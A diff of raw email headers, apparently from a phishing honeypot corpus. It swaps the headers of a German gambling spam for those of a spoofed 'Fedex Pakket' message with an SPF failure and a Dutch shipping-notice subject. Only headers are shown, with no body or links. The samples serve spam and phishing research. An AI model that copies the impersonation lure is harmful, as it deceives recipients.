@@ -1,278 +1,735 @@
-Received: from CY8PR10MB6538.namprd10.prod.outlook.com (::1) by
- MW4PR10MB5749.namprd10.prod.outlook.com with HTTPS; Thu, 5 Mar 2026 01:17:50
+Received: from SJ2PR20MB7061.namprd20.prod.outlook.com (::1) by
+ SN7PR20MB5311.namprd20.prod.outlook.com with HTTPS; Tue, 17 Jun 2025 01:07:35
  +0000
-Received: from CH2PR18CA0034.namprd18.prod.outlook.com (2603:10b6:610:55::14)
- by CY8PR10MB6538.namprd10.prod.outlook.com (2603:10b6:930:5a::17) with
+Received: from DB8PR09CA0023.eurprd09.prod.outlook.com (2603:10a6:10:a0::36)
+ by SJ2PR20MB7061.namprd20.prod.outlook.com (2603:10b6:a03:56b::11) with
  Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9654.22; Thu, 5 Mar
- 2026 01:17:48 +0000
-Received: from CH3PEPF00000010.namprd04.prod.outlook.com
- (2603:10b6:610:55:cafe::a) by CH2PR18CA0034.outlook.office365.com
- (2603:10b6:610:55::14) with Microsoft SMTP Server (version=TLS1_3,
- cipher=TLS_AES_256_GCM_SHA384) id 15.20.9654.23 via Frontend Transport; Thu,
- 5 Mar 2026 01:17:47 +0000
-Authentication-Results: spf=pass (sender IP is 209.85.160.72)
- smtp.mailfrom=joe8-14351.firebaseapp.com; dkim=pass (signature was verified)
- header.d=firebaseapp.com;dmarc=permerror action=none
- header.from=joe8-14351.firebaseapp.com;compauth=pass reason=111
-Received-SPF: Pass (protection.outlook.com: domain of
- joe8-14351.firebaseapp.com designates 209.85.160.72 as permitted sender)
- receiver=protection.outlook.com; client-ip=209.85.160.72;
- helo=mail-oa1-f72.google.com; pr=C
-Received: from mail-oa1-f72.google.com (209.85.160.72) by
- CH3PEPF00000010.mail.protection.outlook.com (10.167.244.41) with Microsoft
- SMTP Server (version=TLS1_3, cipher=TLS_AES_256_GCM_SHA384) id 15.20.9678.18
- via Frontend Transport; Thu, 5 Mar 2026 01:17:47 +0000
-X-IncomingTopHeaderMarker: OriginalChecksum:219FD8717AB1EF5B7813B596DCA969FDA83BF0A77909058A683E4E91598B5AE2;UpperCasedChecksum:A04C2AAD1FE23C2D51764A56A77CD3A24B417BB9459AF01B8A0F86BDB0E6E961;SizeAsReceived:2297;Count:12
-Received: by mail-oa1-f72.google.com with SMTP id 586e51a60fabf-40450320b4fso13143716fac.0
-        for <phishing@pot>; Wed, 04 Mar 2026 17:17:47 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=firebaseapp.com; s=20230601; t=1772673467; x=1773278267; darn=hotmail.com;
-        h=to:from:subject:date:message-id:mime-version:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=230xbWFcVpUf5/K5rRVjKaevRtYaH59Y5La8qdJ+fcg=;
-        b=kG7o05VoDngCkYO8zVosUowQdsEBYpsgQn4rBytyFrZiJcQ+5+AfHsdBEtgbVWb0xv
-         tYVH4OEGYFYSmd0Nb79AdOgzJGFHyKgj8fS1w/ZGVnVxaSDIyFF5Z7oh06ke3RcUWi0D
-         Nfn3+jIy7bZR1exDslcY9WFM/8nxZz3oCdmuGXtXT+9Rk/O4eu3dsnAX5ihHAClJO0TE
-         68bEVek64PVK+l3ET6w+bFM9+pFH4ba03CjlWKudAtVW3To2xOS/5TkBPGLcnkSkcpjN
-         aXloN0NGbJPh1amnrGHApmdnu2jfta8qZpChwJo7iA55T/gXNwXPa6dlgwx3yZ+2j/cz
-         AsPQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1772673467; x=1773278267;
-        h=to:from:subject:date:message-id:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=230xbWFcVpUf5/K5rRVjKaevRtYaH59Y5La8qdJ+fcg=;
-        b=sxw0B9VYJ7SU4CdaPjEoEMiULdvQkctQObzeDGGkZTjmcFdnFJ2DkG84MgP1Gcy34Q
-         Sw92OLPYpUWd81/T5kr6YsfrkHu6y7atgSkVDlFaUxLG+pORwLw7ca1qtFGzRZZExU65
-         vL2v34D+5CxKPcYlJScqBzTdjCGhZBKztUpZKwa9SdxZ2cqpocQfZTXPleAioA1Ryq76
-         vCECKO4hQ7sZA4Nv+A3vdsGXSrWEGvDa4P+jPYLPkA++uOXbJU8rAr95sZ4tybWTU5Zn
-         WFlbJxeHMhaZ4Vw/cL3DOtLAl9dPQbdCsodslRI+IKO2TTgsDU06WWoUBxmpQq0cGndN
-         TLjw==
-X-Gm-Message-State: AOJu0Yxj6UGdNVP01V/MHfOklMB4BbnfCCSFfoGsJ3+yv3b+zzZU6Tc9
-	W3vctx2QaPI9pkYzGCE16xwyZiihwbj/qpgihG8w/i3Btshdk2isjEAdD+iugEG3fZp7jGHkRJP
-	MVSQ+OBcLAw==
-X-Received: by 2002:a05:6870:71ca:b0:3e0:de76:31e5 with SMTP id
- 586e51a60fabf-416aba43492mr2089776fac.25.1772673467472; Wed, 04 Mar 2026
- 17:17:47 -0800 (PST)
-Message-ID: <00000000000054dcce064c3cb4e4@google.com>
-Date: Thu, 05 Mar 2026 01:17:47 +0000
-Subject: =?UTF-8?Q?=F0=9F=8E=81_300_GRATISFAHRTEN_erwarten_dich=21?=
-From: FamBet <no-reply@joe8-14351.firebaseapp.com>
-To: phishing@pot
-Content-Type: multipart/alternative; boundary="00000000000054dcbd064c3cb4e1"
-X-IncomingHeaderCount: 12
-Return-Path: no-reply@joe8-14351.firebaseapp.com
-X-MS-Exchange-Organization-ExpirationStartTime: 05 Mar 2026 01:17:47.8251
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.8835.23; Tue, 17 Jun
+ 2025 01:07:34 +0000
+Received: from DB1PEPF000509E6.eurprd03.prod.outlook.com
+ (2603:10a6:10:a0:cafe::b8) by DB8PR09CA0023.outlook.office365.com
+ (2603:10a6:10:a0::36) with Microsoft SMTP Server (version=TLS1_3,
+ cipher=TLS_AES_256_GCM_SHA384) id 15.20.8835.25 via Frontend Transport; Tue,
+ 17 Jun 2025 01:07:33 +0000
+Authentication-Results: spf=fail (sender IP is 170.64.186.227)
+ smtp.helo=goalsshop.store; dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=;
+Received-SPF: Fail (protection.outlook.com: domain of goalsshop.store does not
+ designate 170.64.186.227 as permitted sender)
+ receiver=protection.outlook.com; client-ip=170.64.186.227;
+ helo=goalsshop.store;
+Received: from goalsshop.store (170.64.186.227) by
+ DB1PEPF000509E6.mail.protection.outlook.com (10.167.242.56) with Microsoft
+ SMTP Server id 15.20.8835.15 via Frontend Transport; Tue, 17 Jun 2025
+ 01:07:33 +0000
+X-IncomingTopHeaderMarker: OriginalChecksum:CD6F6BD226A5ECCEF1C78B2A2B7C2B4D6E5B60A12959F0A9162C6BEBCC9488A5;UpperCasedChecksum:FD9678C3EAB121B9961DE72738ABDBB6BA5E04CD57E02E91D2CD85A2CDBE33DC;SizeAsReceived:361;Count:8
+Date: Tue, 17 Jun 2025 01:07:32 +0000
+Message-ID: <598501760719914.1.WAM0093370962@goalsshop.store>
+To: <phishing@pot>
+From: =?UTF-8?B?RmVkZXggUGFra2V0?= <>
+Subject: =?UTF-8?B?QmV2ZXN0aWdpbmcgdmFuIHZlcnplbmRpbmc6IHV3IGJlc3RlbGxpbmcgaXMgb25kZXJ3ZWc=?=
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+X-IncomingHeaderCount: 8
+Return-Path: <>
+X-MS-Exchange-Organization-ExpirationStartTime: 17 Jun 2025 01:07:33.9781
  (UTC)
 X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
 X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
 X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
-X-MS-Exchange-Organization-Network-Message-Id: 4f91bcdb-e944-4522-d941-08de7a55033b
+X-MS-Exchange-Organization-Network-Message-Id: 07c6057c-bf94-46d9-79d6-08ddad3b5789
 X-EOPAttributedMessage: 0
 X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
 X-MS-Exchange-Organization-MessageDirectionality: Incoming
+X-MS-Office365-Filtering-p2NotCompliant: true
 X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: CH3PEPF00000010:EE_|CY8PR10MB6538:EE_|MW4PR10MB5749:EE_
-X-MS-Exchange-Organization-AuthSource: CH3PEPF00000010.namprd04.prod.outlook.com
+X-MS-TrafficTypeDiagnostic: DB1PEPF000509E6:EE_|SJ2PR20MB7061:EE_|SN7PR20MB5311:EE_
+X-MS-Exchange-Organization-AuthSource: DB1PEPF000509E6.eurprd03.prod.outlook.com
 X-MS-Exchange-Organization-AuthAs: Anonymous
-X-MS-UserLastLogonTime: 3/5/2026 1:08:04 AM
-X-MS-Office365-Filtering-Correlation-Id: 4f91bcdb-e944-4522-d941-08de7a55033b
+X-MS-UserLastLogonTime: 6/16/2025 11:59:13 PM
+X-MS-Office365-Filtering-Correlation-Id: 07c6057c-bf94-46d9-79d6-08ddad3b5789
 X-MS-Exchange-EOPDirect: true
-X-Sender-IP: 209.85.160.72
-X-SID-PRA: NO-REPLY@JOE8-14351.FIREBASEAPP.COM
-X-SID-Result: PASS
+X-Sender-IP: 170.64.186.227
+X-SID-Result: NONE
 X-MS-Exchange-Organization-SCL: 9
-X-Microsoft-Antispam: BCL:0;ARA:1444111002|970799060|9400799043|58200799021|45200799018|10300799038|69000799018|1680799066|9020799019|9000799056|9109299003|60050799006|87000799018|32080799006|13020799006|51300799021|9800799015|5139299004|70000799015|46080799006|461199028|3069299007|32020799003|20103052909095|34130799006|2700799029|1380799030|1370799030|1360799030|1602099012|10417399012|440099028|4302099013|3412199025|30041999003|26104999006;
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 05 Mar 2026 01:17:47.8029
+X-Microsoft-Antispam: BCL:0;ARA:1444111002|1680799057|51300799021|3025599003|87000799018|22300799015|27400799015|13020799006|26400799015|32080799003|9000799050|9800799015|25000799016|461199028|9400799033|10300799035|69000799018|6010799018|70000799015|15120799003|45200799018|20103052909095|26120799003;
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Jun 2025 01:07:33.4271
  (UTC)
-X-MS-Exchange-CrossTenant-Network-Message-Id: 4f91bcdb-e944-4522-d941-08de7a55033b
+X-MS-Exchange-CrossTenant-Network-Message-Id: 07c6057c-bf94-46d9-79d6-08ddad3b5789
 X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
-X-MS-Exchange-CrossTenant-AuthSource: CH3PEPF00000010.namprd04.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthSource: DB1PEPF000509E6.eurprd03.prod.outlook.com
 X-MS-Exchange-CrossTenant-AuthAs: Anonymous
 X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
 X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: CY8PR10MB6538
-X-MS-Exchange-Transport-EndToEndLatency: 00:00:02.6093650
-X-MS-Exchange-Processed-By-BccFoldering: 15.20.9654.014
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ2PR20MB7061
+X-MS-Exchange-Transport-EndToEndLatency: 00:00:02.5408794
+X-MS-Exchange-Processed-By-BccFoldering: 15.20.8835.023
 X-Microsoft-Antispam-Mailbox-Delivery:
-	ucf:0;jmr:0;ex:0;auth:1;dest:J;OFR:SpamFilterAuthJ;ENG:(5062000311)(920221119095)(90000117)(920221120095)(90005022)(91005020)(91035115)(9050020)(9100341)(944500132)(2008001181)(2008121020)(4810010)(4910033)(9710001)(9610028)(9520007)(10115022)(9320005)(9245025)(120001);RF:JunkEmail;
+	ucf:0;jmr:0;ex:0;auth:0;dest:J;OFR:SpamFilterAuthJ;ENG:(5062000311)(920221119095)(90000117)(920221120095)(90002001)(91000020)(91036095)(91040095)(9050020)(9055020)(9100341)(944500132)(2008001181)(2008121020)(4810010)(4910033)(9710001)(9610028)(9520007)(10103005)(9320005)(9215007)(120001);RF:JunkEmail;
 X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MjtHRD0xO1NDTD02
 X-Microsoft-Antispam-Message-Info:
-	=?utf-8?B?MSs3QzlvV1M4enRXcEhQUHlMeXZyRFl6dW9MV2NydDZRTHk5a3JTNXo0V0dZ?=
- =?utf-8?B?bGk1RkdhWXZXOUMrRkZqRHNHeFJJbkhXT2lNUDJPR2hlVWVVRWFnZjlRWWZK?=
- =?utf-8?B?VmFvajBNbHBlUi9qOGU2cXZOR1JuZm5ZNDdwRDQ1UWFIa0F3aDRaWGFMMTR1?=
- =?utf-8?B?WUIrZk9PK2xDUzBPbUpYQWphNG5VaFdhZy9YVTQ3NlY2VTJlTzVwUDNUajFN?=
- =?utf-8?B?YXNabGUrbmVrWHRzYURvOUtobHRFbngvL0xPc09nNXZ0K2ZMZ0N5L2xCRXhr?=
- =?utf-8?B?QVJ5Znp5ckpNbThUaGhYV1E2VnhmUko2QU5vTVdWK1U1NENQZm1meHYwYlVt?=
- =?utf-8?B?cGsweXdvTk5Xd084aW81QVg4RjJKTWNvREJFNS9Oa0Rvd2JDS0VmRmF0RGpv?=
- =?utf-8?B?WTBRMDd1OCtjR3JmS3Y2TUYzaHM1VzNzL3VCcW11bmFQaytTTVJieEdTZUZ3?=
- =?utf-8?B?Zkt6c3hCS1dFR0x1TWZzcENSK2dEbUNhOEhpQ0VWQjdabVpjcnd0YWsvaGNJ?=
- =?utf-8?B?ZWMwSGhnaHp0WFgwcUxVdXVwa1d0dTV0KzZFWUwwcUlJZ294ZU00UFh2NHp4?=
- =?utf-8?B?V0dSYTR1RnEzWFE4UDgzTkxUSGM5QUE5U1E2MnRMWjdwdXdSd29oRUFnQVlV?=
- =?utf-8?B?OU44NFpIeU1nQU0rMUNIaERoRkU1b2UxaHJkQW9sUmYyc2VoNngzbjVKL01L?=
- =?utf-8?B?R3U4MEMvMTNVQ3NXZnJNODNpQTVWOUxzelRpcnE5L1ZsM3ZVRU51aVl4L0JH?=
- =?utf-8?B?amdmYTRsWEswQlRRMkFwNHBPejZKR1NjQlpDejJ2NXRJUk9NWkJjOHVFbncw?=
- =?utf-8?B?QnJlS3N4VTJWano0Q2dKcTNiSmNYbkNsWjJxbTI0SktmUFc2eXpEc3VxWHpL?=
- =?utf-8?B?V2lYUUJvOG4xdkgrYytacXlMZXEvbmZIellYM0JpVDRLcm5hYnVRTXAvVE8z?=
- =?utf-8?B?ekVXWDhCQm55RkYzdW5nbkIxN2l0R3B0RlByV1RoVG1LcHpMVkJjNlMzQUNY?=
- =?utf-8?B?a1l5dDQxZU4yRnlYV3hMOXNmejJMWVVWdkw1WWhSejZiOWVlYU5oTnB6Y2FL?=
- =?utf-8?B?b2hjVFlUd1k5emp5Z0Q3bFlZUDJPWWZRU1dIY1dZcG4zaFZOQW5ReS9YNGZO?=
- =?utf-8?B?MG13a01lUVhqelZKL3EyQzBGbTlIRFkwekNzbG4zek10c1UwdGoyV3oyVVV0?=
- =?utf-8?B?dkV1QUNCd3pBdzNnbk1nbnJIOFM2b291WWdEbE9KWUdLaFV1NEl4bkEzZFRk?=
- =?utf-8?B?VUVqTWxFWkRxTjRmY3g5UmJLbGJkVUxVVkFScHRaRFFpcVNrNWY1Z2ZkNnpY?=
- =?utf-8?B?Z3NEQXd0VDN5Qyt3R2lzKzNBek5NRXkxdytvcDNhMlVMVjU4SGh3czU5bGYv?=
- =?utf-8?B?NFNKRTNyNW91c2xVcThaZGJ5VUptcFUvOHhlZnJHZis2V2lCSThLRjFQUFRJ?=
- =?utf-8?B?T0pMSVFidmdzaDlJUXRjemsyVmQweVN0eFp0b25pUnkvcDlRYXlRWUlEM0tv?=
- =?utf-8?B?a2tjR0dpUytSaVVqMkZtVk0zM3hFUzhTdjhrNGQwM2ZlQnZEWHpZNlg1S3Ra?=
- =?utf-8?B?QlBOSEpVTmRYbmhtVnd5TGFydndGVXduSm55MndwYzB5UG1Oek5nNVFma0JX?=
- =?utf-8?B?cTZmRVJpZUhsejczOVFzTGtJQ2pENUpNa3ZObTNwSnVBM2VCMmZvdzlEY2Uv?=
- =?utf-8?B?NzgvN2Q5amVKVStFYk9mWExyNXprL3VDd21HcWx0RnlJVytLeGdIWmw3Undx?=
- =?utf-8?B?SkRNQ3hRRkpjT3pFaHF2TnlXS2UwdFpNekR5UnNHSWl3cG1pMVJwNHpTM3Iy?=
- =?utf-8?B?SHF2VjFHY293MExxSGVLeGZPZ2FBQlBRTE03R3Q3V25uMVg4T21rU0ZrdU1v?=
- =?utf-8?B?dS9STE9sZnh6TmczV1k5YWw4eFJxT20xbjlVbGYzNmoxS3crVExaZnZkRmww?=
- =?utf-8?B?M3pxL2tOK2l2bHVQWFY5Njd5NVlPbmM2MFhqZmQyVWZqRk14TEVEVldlQTBj?=
- =?utf-8?B?c3JndmFWZUVuUWxYZyt5MHU2TzFnQUM0QzZ6aEN4RWxVb2pVK1k0YUxSbnBz?=
- =?utf-8?B?YnZFdXJFOGk2TGhGYng2UHNKejRQVUh6R0FKUXRnSjY5ckMweVhOZ3U0MmF4?=
- =?utf-8?B?WU9MNG11eDFCSHdaY2tZcElZNFpkZHZGNHEvNnVtb3M2bVdWZkxBcmlSaWtH?=
- =?utf-8?B?TjUwR3Y4L01ZcGpmY2UzRlNmMXA5SkRmWVNKaDlwU2Nwems4K3ZIc0VVcUUy?=
- =?utf-8?B?ckZvRWx3eDRPNVpkcEw3YnRDeWNidUJxYnRVWUVzKzQzT2lvbEN2YysrRFFT?=
- =?utf-8?B?L0JnYm5iK0ptRExZdVJnRGZmamFrRCt3RS9pRWlUaEY5WitMR0NJbFVNSFBo?=
- =?utf-8?B?WFI4aVVSSGkrc1dYcU1ud3M4c0JnMXlVQVRKUW13UG9VaS9jVzR0c3B4bVpI?=
- =?utf-8?B?SU0zQUxjK2hhdEJQbkU1UExIL2FyNE1OUzVWbXgzQzVkaHFNcFU3ZW01ZVBv?=
- =?utf-8?B?VUUyalhwWVh4RXc3ckxCSEVKalBieXl2N1poZGxzQ29OZHErNDkxbnhWS0Z2?=
- =?utf-8?B?NmdaQVhIWFhDM3libmFkQlh6RVlHOVRJRG10T3FlN0RZT2xIUjNGVmlLU0Ry?=
- =?utf-8?B?ZWlKUXQxRTBqM3F1K1hqT0s2aStML1FrVnRqU0ZiV1BjMmp5aFVnN2Y0V1JE?=
- =?utf-8?B?VkNaT0pVVGxJVnY3MlZYbVBnNXJpNnJQNGloR3A4cy9HZm9uVFpoVzd1UlNx?=
- =?utf-8?B?TmpObVBkWGI3bklWUzhnTWJiMC91MnBPWEY5bUcrRUxLNU1FdTdYcGZWTDFp?=
- =?utf-8?B?YzZqUlVaNTBWb3JtWDhycVNsK1dJbDgvOXI1VHBNd0N4WWxENFJVUklwdGw4?=
- =?utf-8?B?UGliWXo4V1pHb0EwOU5ENmN4ajcrN3Fhd2U1MlJ6M3YzbE8weTVoNDJ1MUpr?=
- =?utf-8?B?M2ZycEw3elRFdklvdG9GZHUzQXB0dDZtR3NLTGhtblV1QmFybUl6elkyNG9I?=
- =?utf-8?B?M2VqZFZqNFE3Sm5oVDI3UUliQy9BanlMUmMvYTNvU2VpVmxsUWZkejl6LzBs?=
- =?utf-8?B?MnlkS3M5Sm1leW9uNmExcGhsRXZEMU9HODhkajU2YXowUnlvWE1MUDVYZHpS?=
- =?utf-8?B?eTZETjM3dlJ6UFM4eWNaVy9Fc2R6U2czV2JnaFJoVFlFT3U2elpRMm1UMks1?=
- =?utf-8?B?Q1hHM1kzWWNCSFZpZGVSTi8rdXlEellITWlQQjRVT2dXY1k0OXVMZjR4UCtl?=
- =?utf-8?B?WGtnUDBJRXZLL1lkbzh6TkdQSnRtbmZIMEZ3V1lVUjhjZjZmdkVZSVJILzhj?=
- =?utf-8?B?ZEt5VmhPMXZMakNKRytIZnRkbU1BWVllc21CdWw2U1BBOUMxMzU5KzUrRTds?=
- =?utf-8?B?MHpYRU14dXl0NEJyY25CaVIzTmZ3bVkzYTNVQmF6c3FRaXhUZllHWW5sSUZq?=
- =?utf-8?B?c2NFanV1TU5ucW1qOFlGR05NaVdGaW82alhtcjFmbUt6Z3J2ck1OMnVMV0Yx?=
- =?utf-8?B?cXdQOWE3U3VDcTVtVUlDUnlwdm1EbHpaSldXUGQ1bGlxSEFHcUxTaHlBR1FE?=
- =?utf-8?B?bzF1RGRtQ1Nsd2xEZ0I4VzY3NUs5MTZGM3RDYjJjd3pXS09nN3liM2Urc25R?=
- =?utf-8?B?NUwvK0g3RXpqUndCRjNrN3A2ZExKQzB1N0Y0elBKWjBRSmUwcE1BczhOMU00?=
- =?utf-8?B?RDY0K3IrSDVPekpkZSsvS1g3amNuSlhtWlZBMTNuT2dlL1ZWSElpSjRoMllD?=
- =?utf-8?B?b0tiUXIremhpa3N6dllaY0VjeWJHK0ZmekllcUFJTEtDeDVmRFhXeXlOaTI3?=
- =?utf-8?B?eGJmVGhuY1pLOEdQekFGMmhmZ0Yxa3llRGthVWN3SVRQYmozajdSRGRUV2dl?=
- =?utf-8?B?U01Yc0RqTVN4akVDMnl4bVQwbVRTRVN5UHhkOXNYazZyUzlObU1kdzI1UEJs?=
- =?utf-8?B?WnNxcWl3cHVlWkxiOUQ5b1FrellSR3NkRS9lOStyYVgreDVpWXVJUkN4K3k1?=
- =?utf-8?B?VEhYb1VDU3BmNFJRajI5RUdUUjZ4OHVxSjh2S3VJeUJ4dGNPeU93L1J4Qnh6?=
- =?utf-8?B?dWZaNkRkYmRQRUpLT2dRc0xWY2VXcGZvd2IxRXlRNVArWkNzM29CRVpXaExD?=
- =?utf-8?B?b0dLbERCbC9YYjBrdXc2TUtaNmhhT0RKby9SZ3JiMjBiTzhKM1c3YXdWN2xP?=
- =?utf-8?B?Y3AzOVZzdUltOWRkblZ6K3FxRGU1SnRweVhCZWw5ZlBuNnB2MHZMaEZhTHJS?=
- =?utf-8?B?L2UrRHpHQnJDVFdoOXhOVStkWlhBcTVxdytmS1VKV3lLUXdiWHNQVW95RXF3?=
- =?utf-8?B?anNOZEhJYkVjUFB5S2o1NjhqbXp1cSsrNDFrb0RhVFRkRjdGaVJGRkE1aWFz?=
- =?utf-8?B?R0xTdEk0eE55a2hqU1RzbWl3Rjk1dWltUThtR3FxY0ZCem1GQW1LMzJNOTFN?=
- =?utf-8?B?WFBWTUJFODkvS3pvQmdqVWNGSUlLbGY0MXkvUTA1RkptSTd3RUl2MDdCQkUz?=
- =?utf-8?B?ZlNvcWF1NlJnWTkvTWpXTTZETVc3SVVKV2FDTDlRYUVwQ0xuTXR6aUJwdlV0?=
- =?utf-8?B?dXFBcnQ1WS9tVnczYzhTczFIQnExckIyZTU0aTdVOGM4T1pTckZRV3RYZTh1?=
- =?utf-8?B?aTdrRGI0cDhLTEoyTlQzRUZHMWRiMU15MTRlZG50WFlVWWlTZjhpY3BMOFZq?=
- =?utf-8?Q?GVh1dIWOeoOVK8SQlYzT2I3udTVxXXtGqTW4?=
+	=?utf-8?B?eUZvb3VqS0EvUlFoWGlEWHpkQm9XOHBEK1Ftc1QrQjhPbG1ySVQwdW9kSzFx?=
+ =?utf-8?B?QkVTendOOFZwT3djQlViWTl4UStwdlBMK1ZBL04vQmt0UVFDRTBwQ2RDNWEv?=
+ =?utf-8?B?NkFWQVF3NTVQU1BUcUpxRDZVNGJnZi9MWCtxQ2p0bkppNm1SOWNMZVpVay9Y?=
+ =?utf-8?B?eDUxd3FkMmF3dG1DaDVqbkpqMXhHMldmcDRteXRiTWV1TlRURVZ4WGl1U1ZY?=
+ =?utf-8?B?cU8yUncyaVMwYVJYaE8yV0hldk1MOG9kQTBtSXdIMG45alpmWG00WG5zL1Nh?=
+ =?utf-8?B?UXUxL2g0Si80Y0MvamNhRW5HY3Y4SXA1dXNYMFB2cFI1SkNiTXl5cXdwamxD?=
+ =?utf-8?B?SU52VEZ0Y2xxMHFGd3pKd0I2TnRtcjZnWWNDRnZkM3V5RDBjNDhTcXk1N0N5?=
+ =?utf-8?B?OWh2NzZ2eVJVZUozWnlORkhBbFhRdkJJNzRWeVBNQU41Q3BlN1VEUHJaTWFQ?=
+ =?utf-8?B?MG5CRlhDUWYwQ3JZc3l0UUNyLzNpRmhJVFlKa1Fnamp6VEd3VkFBSlpDdTJE?=
+ =?utf-8?B?bXMvSHZJN0dlU0lXQ080NTZCRmtBRUJQL2VKRGxXRnJxRkpDVkRCNEV3bUNj?=
+ =?utf-8?B?RjJrSzBGZnBSMHMrWFEyTFM5VFhra0s2K296ZG1ZU1VJRllVbExXZlhNTmk3?=
+ =?utf-8?B?TGwrK2hlN3lZN3BYRVl4b0ZHWjFIQjBxcm5BR2JGWEROS09ONVpQck5maVJk?=
+ =?utf-8?B?VEthYWg3QUJBY0cvRnkrZHRhZjhVdkNydy93ck44c09WTXFKRy9QQ0RaYnIz?=
+ =?utf-8?B?eHY1NEEveU5WZ3k5eGdRQUdFb2RnU0tlbk1Kdmc5ZG80d0Mxb0FkMmVsV1dF?=
+ =?utf-8?B?VHQ2YUgyb2RuUllJcmVFT3MvUW5lTTVuR1FHK3MwSHF6ODhzcnpoYVUzMi9P?=
+ =?utf-8?B?ZkNiRjcrMGlpRnQ4QmpWUEMzelQyODdjbSthb1l3Z1pENlNJTVRBamcyeUJ4?=
+ =?utf-8?B?amhTRXBZdnRLUE8vRldZT0ROUDJOZm5STTJCOUNNQ3JCK1RPT2lVZEtVMGVM?=
+ =?utf-8?B?U0RLd29IaHhMSWhkNjZpSlJ5N2E2ajlHcGNoVmNpUGJTVmdyVmRYTk80djNu?=
+ =?utf-8?B?REpmOGlHOGhiNjdPY2d1eHA5ZWRFcDVlWm1pZjQ1RmZXajhqaUFGamY3WU9K?=
+ =?utf-8?B?R3dBVytXM1hZeDI2Y1BYcE9pMmdqOWxLcnFacFQxVVBDN1M0TlliOFJ2cHRY?=
+ =?utf-8?B?ZFhuMzJKWU1oRjhsZDdKZyttSVVlTWZjaXhxUDZQM2FQZ2FHNUJOdWo3Sm5Z?=
+ =?utf-8?B?ZncrNkVEMisxOXp5VFc1Z01nUm1yU01RK1krTXQ2NnBsQW1DWHBNREFxcHpT?=
+ =?utf-8?B?ODRIcWVpSEk3eVgySDZraEh3a2djUGxDdDFrN005bEFnOUlubVRNbDViYktH?=
+ =?utf-8?B?aWRWSnJERkd4cHB4a2NWUGlua2Z2ZnJLOURRallMVGNhaUcvWlJJdGxqdHlq?=
+ =?utf-8?B?bE50ZzN3UGl1ZXd6NlBEOE5lK3QzNkNHbnBjb1c5VTdjL2xNblIrRkVxQ0NV?=
+ =?utf-8?B?NTBHMWRvMVV2bThlaFJkd1oyVTE0aGwzV3JnM242YysxUk9IMW0wZ3pIRk1D?=
+ =?utf-8?B?VHBSOUNrcXVFMkpTbU8vaWl5c0ZFc3V2NXVYM3pZemo2aXgwcUFqNWNMWm1Y?=
+ =?utf-8?B?Z0xKVWU4Y2JhMEgrcmlBTXdhUUtwZ0cyV0U5VnFHRy9Oc1hYaC9ya0U5QmRh?=
+ =?utf-8?B?RWNuNnZWM2tUbmQyK1dGWU51Zkg2UUEwdzR5THVhRUNZOUJxQ09Mckp3cnBj?=
+ =?utf-8?B?OVR5RXpIc05lcmJpaVAxdWdnVUFFN0dFblZXdXZjRXdaTzlqZ3NMVG9rcjBW?=
+ =?utf-8?B?SDBhZ2pFclZCcmp0WCtMckcrN21nK1hQUkpvOEVBRU9EYlkrVmdkbGZlbU1M?=
+ =?utf-8?B?RkRaYUYveGQ5Y2JUd2NVV1BLOFFVT3Vqd3E4aHdvVEpDOUpBNzVFQlgvdjUr?=
+ =?utf-8?B?U0xDa1hmTXl5MEs1WTJhTmNNRk1sUEVWSjUvQTdYVjhzWDY1MkNKZW8yQmtl?=
+ =?utf-8?B?T1VOUE00OXpGRDFud2taZ2dWS2RiWHNCN203TDYyU25MWmE0L3ZMeE5sKzM2?=
+ =?utf-8?B?U3YyWEkzZzQ0am1Sd0RObDkreVZFNk1wcGpUYW9LSVJUT0wzS0FnUkpmVXJs?=
+ =?utf-8?B?UG4wWlZ1TzN3OTB4ZWZrSTNpUnl5RW4vcjNCSnBSSStxd1NkM1k2czgzUjBJ?=
+ =?utf-8?B?KzhmZlYvTlRrRjdSNGdBV0h6dkhpcUpBb3Bpd1M4Y2pVcE9oRjRxYkZCVXR2?=
+ =?utf-8?B?NW5KUllQYXRkSjc4aUplOTVKanF4MGhVY3IrMDZnNzBzWDM5NzVTaE5DVDUx?=
+ =?utf-8?B?c01JTzRIeUpPN0prKzRxaFJIcmVINFRhaHhlUkh0bHkrOG9JSGxvbHZMOVEz?=
+ =?utf-8?B?bUVkMEdqTElWczI1S3VSV0FSSHd3bXpJQlc3YjJzQUZFT1dQYmV1bE5kQWFE?=
+ =?utf-8?B?QmkwblNoOUp6N2ZVVnN6TnRYSlhpenp5NkFSV210Y1FOZ1pPczhZcTNEOGhQ?=
+ =?utf-8?B?LzgwUWwzMmVBTTM2OGl3Z1FCb1FPSlA5UjNjekhINmhmMVhkcXJjK01tdUlI?=
+ =?utf-8?B?QTJhREZkSWg0OEh2M3J1TjhjS1ZVOFlnMFg0UkJ6UUdBVURsNzZ0dWxybGo4?=
+ =?utf-8?B?ZmlFUDZtU1JGbVNRMTNSSWtlWXQvdFZ3TG5FYjJ5THFvRU1KSnppbnI5TFIz?=
